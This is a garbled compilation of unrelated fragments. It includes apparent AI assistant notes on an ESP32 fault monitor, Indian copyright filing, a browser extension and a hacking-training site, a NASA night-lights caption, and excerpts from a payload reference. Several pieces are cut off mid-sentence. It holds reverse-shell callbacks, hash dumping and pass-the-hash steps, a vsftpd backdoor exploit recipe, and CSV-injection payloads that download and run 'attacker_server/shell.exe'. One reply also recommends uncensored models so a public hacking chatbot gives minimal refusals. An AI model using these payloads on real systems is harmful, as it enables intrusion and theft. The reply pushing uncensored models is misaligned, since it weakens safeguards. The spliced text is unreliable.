exactly this way.

text: DS18B20 you already tried (fix wiring/resistor), or **MLX90614** non-contact IR (~₹800). Temperature catches: cooling failure, overload, bearing friction heating — vibration often misses these until late.

title: 6. Enclosure + mount quality — ~₹500–1,500, underrated
text: Mounting is the #1 real-world accuracy killer. A rigid **neodymium magnetic base + flat contact face** beats any firmware improvement. Velcro/loose mounts destroy high-frequency sensitivity and make every installation different. # Method upgrades (free, firmware only) 1. **Envelope/demodulation analysis** — for bearing faults: high-pass the vibration, rectify, FFT again to expose bearing defect frequencies (BPFO/BPFI). Implementable on ESP32, uses existing FFT code. 2. **Waterfall trending** — store spectral bands hourly (drift tracker already does the plumbing); showing "vibration at 45 Hz rising over 2 weeks" is a killer demo for sponsors. 3. **Two-stage alarming** — Warning (zone/ISO-based) vs Fault (signature deviation). Already partially built; tune it to ISO zones. 4. **Cross-sensor validation** — fault confirmed only if vibration *or* audio *or* current agrees → slashes false alarms. 5. **Self-calibrating noise floor** — measure ambient audio/vibration when machine is off (you already detect stopped); store it as the noise floor reference so environmental noise doesn't pollute thresholds. # Realistic accuracy targets for the product spec sheet | Metric | Honest target | |---|---| | Sustained mechanical anomaly detection | 95%+ | | Stop/restart detection | 99%+ | | Mount change | ~100% | | Signature class correct | 80%+ | | False faults | <1 per 8h running | | Electrical/thermal faults | covered only with added sensors | # Recommended prototype v2 BOM (~₹2,500–4,000) ```text ESP32 (have) ADXL345 (have) → keep, plan IIS3DWB upgrade path INMP441 (have) A3144 hall + magnet (add: RPM/order analysis) ACS712 or CT clamp (add: current/electrical) DS18B20 or MLX90614 (add: temperature — fix your earlier wiring) OLED/buzzer/button (have) + magnetic enclosure ``` That BOM d

title: Sensor & acquisition robustness
text: - **I2C bus recovery** — if ADXL345 reads stall, reset `Wire` (`Wire.end(); Wire.begin()`) and re-init the sensor; log recovery count. Currently one bad read chain can wedge the bus forever. - **I2S recovery** — on repeated `i2s_read` errors, uninstall/reinstall the driver instead of staying in Sensor Error. - **Sample-rate watchdog** — verify effective vibration rate (measured vs 400 Hz); if I2C can't keep up, drop to 200 Hz gracefully rather than silent gaps. - **Graceful degradation** — mic fails → keep monitoring vibration-only with a "degraded" flag, instead of full Sensor Error. Same for accel. You already have per-window `vibOk`/`audOk` — wire them into a degraded mode. - **Sensor self-test on boot** — you have the boot check; add frozen-data detection (identical consecutive windows) and saturation detection (already partially in `sampleVibrationWindow`).

title: System reliability
text: - **Watchdog timer** (`esp_task_wdt`) — feed in `loop()`; if acquisition or a handler hangs >10 s → safe reboot, NVS counter for reset reason, resume monitoring + profiles after reboot. - **Brownout/power-loss safety** — NVS writes are already checksum-guarded; add a "dirty flag" pattern so a power cut mid-write doesn't corrupt the baseline (write to a second slot, then commit flag). - **Memory monitoring** — track minimum free heap, alert if declining (leak detection); NVS counter for uptime/fault-hours for warranty evidence. - **OTA or serial recovery** — at minimum a documented recovery reflash path; OTA update endpoint is a product-tier feature for later. - **NVS wear management** — drift writes are hourly (fine); ensure nothing writes NVS per-window.

title: Algorithm hardening
text: - **Per-installation noise floor** — during "stopped" detection, capture ambient audio/vibration as the noise floor so a noisy factory floor doesn't corrupt thresholds. - **Adaptive thresholds** — widen envelopes slightly if the machine is near a boundary for days (slow environmental drift), but never inside a fault. - **Startup transient handling** — the `Stopped → Starting → Healthy` convergence we discussed; prevents the biggest false-alarm source. - **Cross-feature sanity** — e.g., vibration ratio <0.45 but audio *unchanged* and mount fine → more likely a sensor/acquisition issue than a stopped motor; weigh evidence instead of OR-ing thresholds. - **Debounce on signature flapping** — signatures should require N consistent classifications before display changes (same hysteresis as states). # Part 2 — Patentable method candidates Honest framing: raw "learn + compare" is published prior art. What's potentially novel is **specific method combinations that solve a stated technical problem**. Candidates ranked by defensibility:

title: Stronger candidates (specific, testable methods)
text: 1. **Dual-sensor sustained-evidence recovery latch** — "a fault latch cleared only when ≥2 independent sensing modalities (vibration band energy AND acoustic band energy) each satisfy learned-envelope convergence for M consecutive windows." Your stopped-latch + audio-assisted recovery is exactly this. Prior-art check needed, but the *joint-modality hysteresis* is specific. 2. **Quality-gated single-press field learning** — "one-button learning that collects multi-window robust envelopes (median/MAD/percentiles), rejects the session if mount stability/signal quality checks fail, and scores the resulting profile." The rejection logic + quality score is the claim. 3. **Signature classification from per-feature envelope deviations** — classifying a change pattern (impulsive/low-freq/high-freq/acoustic/broadband/drift) from *normalized robust deviations* rather than raw thresholds. Specific method, specific output. 4. **Remount-aware baseline revalidation** — detecting orientation change → flagging "relearn recommended" → auto-validating whether new mount orientation still matches within tolerance vs. forcing full relearn. 5. **Drift trend on resource-constrained node** — the hourly NVS ring + per-feature slope + baseline-envelope-relative threshold. "Long-horizon degradation tracking in <8 KB NVS without external storage" is a decent claim angle.

title: Weaker / likely-unpatentable (prior art dense)
text: - FFT band features, crest/kurtosis on accelerometers — textbook condition monitoring. - "ESP32 + accel + mic + anomaly detection" — the Sensors 2025 paper covers it. - Buzzer patterns, OLED pages, dashboards — not patentable subject matter.

title: 1. Prepare your materials
text: - **Source code excerpt**: first 10 + last 10 pages of your main source (usually `fault_detection_dashboard.ino` is enough as the representative work — you don't submit the whole repo) - **Applicant details**: your name, address, nationality, ID proof (Aadhaar/PAN) - **Title of work**: e.g., "Universal Machine Monitor — embedded firmware source code" - **Category**: *Computer Software / Literary Work* (source code registers as literary work under the Copyright Act) - **Declaration that the work is original** and you're the author/owner - **Date of first publication**: if unpublished, say so (your private repo = unpublished — good) - **NOC from author** — only needed if applicant ≠ author; you're both, so skip - Power of attorney — only if an agent files for you; filing yourself, skip

title: 2. Create account & file online
text: 1. Go to **copyright.gov.in** → "New User Registration" → create login 2. Login → **"Online Registration of Copyright"** → Form XIV 3. Fill the application: - Class of work: **Literary/Dramatic work** (that's the category software code goes under) - Title: your project title - Language: English (code counts as English) - Published/Unpublished: **Unpublished** (unless you've made the repo public — keep it unpublished until patent filing anyway) - Author details: you - Upload the source-code excerpt PDF + ID proof 4. **Pay fee online**: ~₹500 per work for literary/software work (individual)

title: 3. Dairy number & diary
text: - After filing you get a **Diary Number** immediately — this is your filing receipt; keep it. - There's a mandatory **30-day waiting period**: the application is open for objections. If anyone objects, you respond; if none, it proceeds.

title: 4. Examination
text: - The Copyright Office examines the application (can take 1–3 months, sometimes more). - They may raise a **discrepancy letter** (asking to fix something — usually formatting or the excerpt). Respond within the deadline. - If clear → **Registration Certificate issued** with an ROC (Register of Copyrights) number.

text: URL: https://svs.gsfc.nasa.gov/31099 NASA’s Black Marble products are also being used by scientists and decision-makers to monitor gradual changes driven by urbanization, out-migration, economic changes, and electrification. These images show the rapid electrification of India’s rural settlements in recent years. Huge swaths of northern India, relatively dark in 2012 night shots, are lit up in NASA’s Black Marble imagery from 2016. These images show the change in lighting intensity from 2012 to 2016 in several regions of interest. The maps were created using two separate night lights datasets (from 2012 and 2016) derived using data from the Visible Infrared Imaging Radiometer Suite (VIIRS) on the National Oceanic and Atmospheric Administration (NOAA)-NASA Suomi National Polar-orbiting Partnership (NPP) satellite. Each pixel represents 500 meters (1640 feet), or approximately six city blocks. Dark purple represents areas with new light since 2012, while dark orange represents areas where light existed in 2012 but no longer exists in 2016. Areas where lighting intensity stayed the same between 2012 and 2016 appear white. Varying shades of purple and orange indicate areas that have become brighter or dimmer since 2012, respectively. Scientists use the Suomi NPP night lights dataset in many ways. Some applications include: forecasting a city’s energy use and carbon emissions, eradicating energy poverty and fostering sustainable energy development, providing immediate information when disasters strike, and monitoring the effects of conflict and population displacement. text: **The engine — real shell semantics now** - `cliMode` state machine — terminal input routes through interactive handlers. `ssh user@host` → masked `password:` prompt (3 tries, never leaks into history). `su` → prompt → real per-account shell level. `ftp` → `ftp>` REPL with `ls`/`get`/`put` on the remote fs. - `msfconsole` → real REPL (`use`/`set RHOSTS`/`exploit`) → module-matched vuln → meterpreter. `getuid`, `sysinfo`, `hashdump` (dumps real `/etc/shadow`), `ps`, `download`/`upload`, `shell`, `getsystem`, `exit`. - `nc -lvnp <port>` listener catches `bash -i >& /dev/tcp/...`, `nc -e`, `socat`, `chisel` callbacks → real reverse-shell session. `multi/handler` too. **Post-exploitation — the full tradecraft** - `john`/`unshadow`/`hashcat` crack real shadow files → discovered creds register for ssh auto-auth. - `sudo -l` is per-user and enforces sudoers; `su` escalates only with the right password. - `scp` exfils real remote files (pull + push, password prompt when needed). - `secretsdump.py` dumps real NTLM-style hashes for every account; `psexec.py -hashes :<ntlm>` passes the hash → session. - Persistence: `useradd`/`passwd` write real remote accounts; `authorized_keys` → passwordless ssh; editing a root cron script fires privesc on the next command. **Enumeration is real, not canned** - `enum4linux`, `smbclient -L` + `//host/share -c "get f"`, `ldapsearch`, `snmpwalk`, `whatweb`, `nikto`, `ps`, `ss`, `netstat`, `ip`, `ps`, `top` — all read the live target's ports/users/filesystem. Corp-net still gated behind `pivot`. **Blue team is real** - `ufw deny N`, `iptables --dport N -j DROP`, `systemctl stop svc`, `passwd` on a weak account — all mutate the target's port/vuln state; attacks re-run to verify. title: Bugs fixed
text: **Overlay positioning** (`overlay_manager.js`) - Overlays positioned via `rect + scrollY` assumed the container sits at document origin — any positioned ancestor on `body`/`html` (e.g. `body{position:relative}` — common) would shift **every** overlay. Now positions are computed relative to the container's own measured rect — bulletproof against containing-block shifts. - Text ranges and OCR boxes inside `position:fixed` containers (sticky headers/navbars) were treated as document-absolute → they'd **drift off the text on scroll**. Now marked fixed like element overlays. - Added a per-frame cache on container measurement so scan bursts don't force one layout per overlay. **Present Mode semantics** (`service_worker.js`, `content_main.js`) - **`GET_CAPTURE_STATUS`/`GET_PRESENT_MODE` were broken for the popup** — `sender.tab` is always undefined for popup messages, so the "⏺ SHARING TAB" pill could never light up. Now resolves the active tab when the sender has none. - Manual-off during a capture was overridden by the 30s backup poll → Present Mode would **turn itself back on mid-share**. Proper `manualHold` semantics now: manual always wins; the hold auto-releases when capture ends. - Settings changes while captured would silently **disable** auto Present Mode — content now tracks manual vs. capture state separately, matching a new `effectivePresentMode()` in the service worker. - Toggling PM no longer triggers a **full clear+rescan flicker** — added a config fingerprint so only detection-relevant changes rescan. - Unified the hotkey handler to use `setPresentMode` (was duplicating logic). **Detection correctness** - `ENTROPY` category was `enabled: true` by default → floods real pages with false positives (any 24+ char token-ish string). Now off by default, as documented.

title: Where it stands now
text: The architecture is already the right one for real-time: subtree-scoped incremental scans, frame-budgeted DFS, batched layout I/O, capture-phase scroll sync, dedup'd audits. The remaining wins are mostly perception and edge coverage.

title: Make it *feel* real-time (engineering)
text: 1. **`transform: translate()` positioning instead of `top/left`.** Every sync currently writes `top`/`left` — that's layout work. `transform` is compositor-only → true 60fps scrolling even with 300 overlays. ~30 lines of change in `syncOverlayPositions`/`updateSinglePosition`. Highest-impact perf change left. 2. **Viewport-first scan ordering.** Initial scan currently walks DOM order — a long page gets its footer scanned before the fold. Sort scan roots by distance to viewport → secrets on screen get covered first. 3. **`backdrop-filter` is expensive.** Each overlay runs a live blur behind it — 300 blurs on a low-end laptop is real GPU load. Offer a "Performance mode" (solid translucent bars, no backdrop-filter) in Options. Present Mode already does this — extend the trickle. 4. **Pause work when tab hidden** — mostly done, but the field sweep and position sweep could also fully disconnect during Present Mode inactivity.

title: Trust & engineering hygiene
text: - **Verify model checksums in `build.mjs`** — pin SHA-256 of vendored ONNX/traineddata. Supply-chain integrity, one paragraph in the README. - **Playwright e2e** — load the extension unpacked in headless Chrome, open `test_page.html`, assert overlay count > 0. Catches manifest/regression breaks `node --test` can't. - **Don't claim "India's first" in copy** unless verified — "built for India's privacy needs" is safer and just as strong.

title: The hard constraint
text: Browsers can't send raw packets — no TCP sockets, no nmap, no real exploits from JavaScript. So "real terminal" always needs a real Linux machine *somewhere*. Three ways to get one:

title: Option A — User's own lab (works today, ₹0)
text: Already built. The REAL LAB tasks in rooms ship working recipes: ```bash # user runs in their own Kali/VM — real attacks, real tools cd Netplus-lab/Netplus/public/targets docker compose -f metasploitable2.yml up -d nmap -sV localhost # → vsftpd 2.3.4 backdoor on :6200, real msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS localhost; run" ``` They attack with their *own* real terminal — the room verifies their answer server-side (e.g. port `6200`). **This is the honest "real" path** — it just uses their machine, not yours.

title: Option B — Hosted attack box (~$5-7/mo, the HTB-like feel)
text: One cheap VPS (DigitalOcean/Hetzner) running: - **ttyd** or **wetty** → a real bash shell over WebSocket → embed as an `<iframe>` in a new "Attack Box" window in NetPulse - **Docker** on the same VPS → Juice Shop, DVWA, Metasploitable2 on an internal docker network (targets only reachable from the terminal container — not the internet) - **Auth** → your existing Supabase login gates the iframe; edge firewall drops all outbound traffic except the docker net (anti-abuse — users can't scan the internet from your box) ``` Browser → wss://attack.icywall.tech → ttyd (bash in container) └→ docker net: 10.10.0.x — juice shop, dvwa, msf2 ``` Real `nmap`, `msfconsole`, `hydra` in a browser tab. ~₹500/mo. This is exactly how the small cyber-ranges do it.

title: Option C — Codespaces (free, decent middle ground)
text: Deep-link each real-lab room to a **GitHub Codespace** template (60 core-hours/mo free per user) — real full Linux in browser, targets run there, zero infra cost for you.

text: **1. It still assumes you can run a lab.** Needs a computer with 8GB+ RAM, ~60GB disk, willingness to install VirtualBox/Kali. A phone-only learner can't do the labs. **2. title: The architecture (what I'd build)
text: ``` Student → floating chat widget on site → /api/chat route → LLM API ↓ [book content injected as context] ↓ answers using YOUR book + general knowledge ``` Three pieces: 1. **Chat UI** — floating widget bottom-right of every page (`components/ChatBot.tsx`) — opens a chat window, streams answers 2. **`/api/chat`** — server route that takes the message, calls the LLM, streams the reply back 3. **Book-awareness (RAG)** — I'd extract the book's text, chunk it, and inject the relevant sections into the prompt — so when someone asks "how do I crack WPA2", it answers *using your book's content*, not generic answers. No vector DB needed — a simple keyword-match retriever works fine at this scale.

title: The model options — this is the real choice
text: | Option | Cost | Quality | "Unfiltered" reality | |---|---|---|---| | **Gemini API (free tier)** | ₹0 — ~1500 req/day | Good | Moderate guardrails — will teach hacking but refuses some requests | | **Groq — Llama/Mixtral (free tier)** | ₹0 — thousands/day | Good, very fast | Less restricted — open models | | **OpenRouter free models** | ₹0 with limits | Varies | Can run uncensored-tuned models (Dolphin etc.) | | **Ollama self-hosted** | Needs a VPS/GPU — ~₹500+/mo | Depends on model | Truly unfiltered (Dolphin-Mistral, etc.) — but infra cost + your server | | **OpenAI/Claude paid** | ~₹500-2000/mo typical usage | Best | Guardrails | **Free path works fine for your traffic** — Gemini or Groq free tier is genuinely enough for a student site.

title: The honest word on "unfiltered"
text: A fully uncensored bot on your public site is a **legal liability for you** — if someone uses YOUR infrastructure to plan attacks on real systems, that's on the site owner. The pragmatic version: the bot teaches everything for labs/CTFs/authorized targets (like the book does — it's already direct and hands-on) with a system prompt that says "authorized contexts only" — which is what actually protects you. Truly-uncensored open models exist via Groq/OpenRouter if you want minimal refusals, and that's a defensible middle ground.

title: What was audited and fixed
text: ### Server - **JWT secret persistence** — if `LABDESK_JWT_SECRET` is not set, the server now generates a 256-bit secret and saves it in the CA/data dir (mode `0600`) so sessions survive restarts. title: PATT: CONTRIBUTING (patt)
text: # CONTRIBUTING PayloadsAllTheThings' Team :heart: pull requests. Feel free to improve with your payloads and techniques ! You can also contribute with a :beers: IRL, or using the [sponsor](https://github.com/sponsors/swisskyrepo) button. ## Pull Requests Guidelines In order to provide the safest payloads for the community, the following rules must be followed for **every** Pull Request. - Payloads must be sanitized - Use `id`, and `whoami`, for RCE Proof of Concepts - Use `[ATTACKER.DOMAIN.TLD]` when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc. - Use `10.10.10.10` and `10.10.10.11` when the payload require IP addresses - Use `Administrator` for privileged users and `User` for normal account - Use `P@ssw0rd`, `Password123`, `password` as default passwords for your examples - Prefer commonly used name for machines such as `DC01`, `EXCHANGE01`, `WORKSTATION01`, etc - References must have an `author`, a `title`, a `link` and a `date` - Use [Wayback Machine](https://web.archive.org/) if the reference is not available anymore. - The date must be following the format `Month Number, Year`, e.g: `December 25, 2024` - References to Github repositories must follow this format: `[author/tool](https://github.com/URL) - Description` Every pull request will be checked with `markdownlint` to ensure consistent writing and Markdown best practices. You can validate your files locally using the following Docker command: ```ps1 docker run -v $PWD:/workdir davidanson/markdownlint-cli2:v0.15.0 "**/*.md" --config .github/.markdownlint.json --fix ``` ## Techniques Folder Every section should contain the following files, you can use the `_template_vuln` folder to create a new technique folder: - **README.md**: vulnerability description and how to exploit

title: PATT: README (Insecure Randomness)
text: # Insecure Randomness > Insecure randomness refers to the weaknesses associated with random number generation in computing, particularly when such randomness is used for security-critical purposes. Vulnerabilities in random number generators (RNGs) can lead to predictable outputs that can be exploited by attackers, resulting in potential data breaches or unauthorized access. ## Summary * [Methodology](#methodology) * [Time-Based Seeds](#time-based-seeds) * [GUID / UUID](#guid--uuid) * [GUID Versions](#guid-versions) * [Mongo ObjectId](#mongo-objectid) * [Uniqid](#uniqid) * [mt_rand](#mt_rand) * [Custom Algorithms](#custom-algorithms) * [References](#references) ## Methodology Insecure randomness arises when the source of randomness or the method of generating random values is not sufficiently unpredictable. This can lead to predictable outputs, which can be exploited by attackers. Below, we examine common methods that are prone to insecure randomness, including time-based seeds, GUIDs, UUIDs, MongoDB ObjectIds, and the `uniqid()` function. ## Time-Based Seeds Many random number generators (RNGs) use the current system time (e.g., milliseconds since epoch) as a seed. This approach can be insecure because the seed value can be easily predicted, especially in automated or scripted environments. ```py import random import time seed = int(time.time()) random.seed(seed) print(random.randint(1, 100)) ``` The RNG is seeded with the current time, making it predictable for anyone who knows or can estimate the seed value. title: PATT: mfa-bypass (Account Takeover)
text: # MFA Bypasses > Multi-Factor Authentication (MFA) is a security measure that requires users to provide two or more verification factors to gain access to a system, application, or network. It combines something the user knows (like a password), something they have (like a phone or security token), and/or something they are (biometric verification). This layered approach enhances security by making unauthorized access more difficult, even if a password is compromised. > MFA Bypasses are techniques attackers use to circumvent MFA protections. title: PATT: README (Virtual Hosts)
text: # Virtual Host > A **Virtual Host** (VHOST) is a mechanism used by web servers (e.g., Apache, Nginx, IIS) to host multiple domains or subdomains on a single IP address. When enumerating a webserver, default requests often target the primary or default VHOST only. **Hidden hosts** may expose extra functionality or vulnerabilities. ## Summary * [Tools](#tools) * [Methodology](#methodology) * [References](#references) ## Tools * [wdahlenburg/VhostFinder](https://github.com/wdahlenburg/VhostFinder) - Identify virtual hosts by similarity comparison. * [codingo/VHostScan](https://github.com/codingo/VHostScan) - A virtual host scanner that can be used with pivot tools, detect catch-all scenarios, aliases and dynamic default pages. * [hakluke/hakoriginfinder](https://github.com/hakluke/hakoriginfinder) - Tool for discovering the origin host behind a reverse proxy. Useful for bypassing cloud WAFs. ```ps1 prips 93.184.216.0/24 | hakoriginfinder -h https://example.com:443/foo ``` * [OJ/gobuster](https://github.com/OJ/gobuster) - Directory/File, DNS and VHost busting tool written in Go. ```ps1 gobuster vhost -u https://example.com -w /path/to/wordlist.txt ``` ## Methodology When a web server hosts multiple websites on the same IP address, it uses **Virtual Hosting** to decide which site to serve when a request comes in. In HTTP/1.1 and above, every request must contain a `Host` header: ```http GET / HTTP/1.1 Host: example.com ``` This header tells the server which domain the client is trying to reach. * If the server only has one site: The `Host` header is often ignored or set to a default. * If the server has multiple virtual hosts: The web server uses the `Host` header to route the request internally to the right content. title: PATT: Python (Insecure Deserialization)
text: # Python Deserialization > Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes. ## Summary * [Tools](#tools) * [Methodology](#methodology) * [Pickle](#pickle) * [PyYAML](#pyyaml) * [References](#references) ## Tools * [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data. ## Methodology In Python source code, look for these sinks: * `cPickle.loads` * `pickle.loads` * `_pickle.loads` * `jsonpickle.decode` ### Pickle The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object. :warning: `import cPickle` will only work on Python 2 ```python import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = "anonymous" self.password = "anonymous" self.rank = "guest" h = User() auth_token = b64encode(cPickle.dumps(h)) print("Your Auth Token : {}").format(auth_token) ``` The vulnerability is introduced when a token is loaded from an user input. ```python new_token = raw_input("New Auth Token : ") token = cPickle.loads(b64decode(new_token)) print "Welcome {}".format(token.username) ``` Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. text: # Node Deserialization > Node.js deserialization refers to the process of reconstructing JavaScript objects from a serialized format, such as JSON, BSON, or other formats that represent structured data. title: PATT: Java (Insecure Deserialization)
text: # Java Deserialization > Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs. ## Summary * [Detection](#detection) * [Tools](#tools) * [Ysoserial](#ysoserial) * [Burp extensions using ysoserial](#burp-extensions) * [Alternative Tooling](#alternative-tooling) * [YAML Deserialization](#yaml-deserialization) * [ViewState](#viewstate) * [References](#references) ## Detection * `"AC ED 00 05"` in Hex * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol. * `00 05`: STREAM_VERSION. The serialization version. * `"rO0"` in Base64 * `Content-Type` = "application/x-java-serialized-object" * `"H4sIAAAAAAAAAJ"` in gzip(base64) ## Tools ### Ysoserial [frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. ```java java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64 ``` **List of payloads included in ysoserial:** | Payload | Authors | Dependencies | | ------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

title: PATT: README (Tabnabbing)
text: # Tabnabbing > Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one. ## Summary * [Tools](#tools) * [Methodology](#methodology) * [Exploit](#exploit) * [Discover](#discover) * [References](#references) ## Tools * [PortSwigger/discovering-reversetabnabbing](https://portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30) - Discovering Reverse Tabnabbing ## Methodology When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's `rel` attribute does not contain the value `noopener` and the target attribute contains the value `_blank`. If this is the case, the website is vulnerable to tabnabbing. ## Exploit 1. Attacker posts a link to a website under his control that contains the following JS code: `window.opener.location = "http://evil.com"` 2. He tricks the victim into visiting the link, which is opened in the browser in a new tab. 3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website. 4. title: PATT: README (CSV Injection)
text: # CSV Injection > Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed. ## Summary * [Methodology](#methodology) * [Google Sheets](#google-sheets) * [References](#references) ## Methodology CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with: ```text = + – @ ``` Basic exploits with **Dynamic Data Exchange**. * Spawn a calc ```text DDE ("cmd";"/C calc";"!A0")A0 @SUM(1+1)*cmd|' /C calc'!A0 =2+5+cmd|' /C calc'!A0 =cmd|' /C calc'!'A1' ``` * PowerShell download and execute ```text =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 ``` * Prefix obfuscation and command chaining ```text =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A = cmd|'/c calc.exe'!A ``` * Using rundll32 instead of cmd ```text =rundll32|'URL.dll,OpenURL calc.exe'!A =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A ``` * Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed. ```text = C m D | '/ c c al c . e x e ' ! A ``` Technical details of the above payloads: * `cmd` is the name the server can respond to whenever a client is trying to access the server * `/C` calc is the file name which in our case is the calc(i.e the calc.exe) * `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data ### Google Sheets Google

title: PATT: README (Open Redirect)
text: # Open URL Redirect > Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access. ## Summary * [Methodology](#methodology) * [HTTP Redirection Status Code](#http-redirection-status-code) * [Redirect Methods](#redirect-methods) * [Path-based Redirects](#path-based-redirects) * [JavaScript-based Redirects](#javascript-based-redirects) * [Common Query Parameters](#common-query-parameters) * [Filter Bypass](#filter-bypass) * [Labs](#labs) * [References](#references) ## Methodology An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing. Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent. **Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. title: PATT: README (Zip Slip)
text: # Zip Slip > The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. ## Summary * [Tools](#tools) * [Methodology](#methodology) * [References](#references) ## Tools * [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities * [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives ## Methodology The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information. **Example**: Suppose an attacker creates a ZIP file with the following structure: ```ps1 malicious.zip ├── ../../../../etc/passwd ├── ../../../../usr/local/bin/malicious_script.sh ``` When a vulnerable application extracts `malicious.zip`, the files are written to `/etc/passwd` and /`usr/local/bin/malicious_script.sh` instead of being contained within the extraction directory. This can have severe consequences, such as corrupting system files or executing malicious scripts. * Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc): ```python python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

title: PATT: README (NoSQL Injection)
text: # NoSQL Injection > NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax. ## Summary * [Tools](#tools) * [Methodology](#methodology) * [Operator Injection](#operator-injection) * [Authentication Bypass](#authentication-bypass) * [Extract Length Information](#extract-length-information) * [Extract Data Information](#extract-data-information) * [WAF and Filters](#waf-and-filters) * [Blind NoSQL](#blind-nosql) * [POST with JSON Body](#post-with-json-body) * [POST with urlencoded Body](#post-with-urlencoded-body) * [GET](#get) * [Labs](#references) * [References](#references) ## Tools * [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool * [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection * [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities. ## Methodology NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. title: PATT: ASP (Server Side Template Injection)
text: # Server Side Template Injection - ASP.NET > Server-Side Template Injection (SSTI) is a class of vulnerabilities where an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary code on the server. In the context of ASP.NET, SSTI can occur if user input is directly embedded into a template (such as Razor, ASPX, or other templating engines) without proper sanitization. ## Summary - [ASP.NET Razor](#aspnet-razor) - [ASP.NET Razor - Basic Injection](#aspnet-razor---basic-injection) - [ASP.NET Razor - Command Execution](#aspnet-razor---command-execution) - [References](#references) ## ASP.NET Razor [Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c) > Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages. ### ASP.NET Razor - Basic Injection ```powershell @(1+2) ``` ### ASP.NET Razor - Command Execution ```csharp @{ // C# code } ``` ## References - [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - April 15, 2020](https://web.archive.org/web/20240905143644/http://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)

title: PATT: Elixir (Server Side Template Injection)
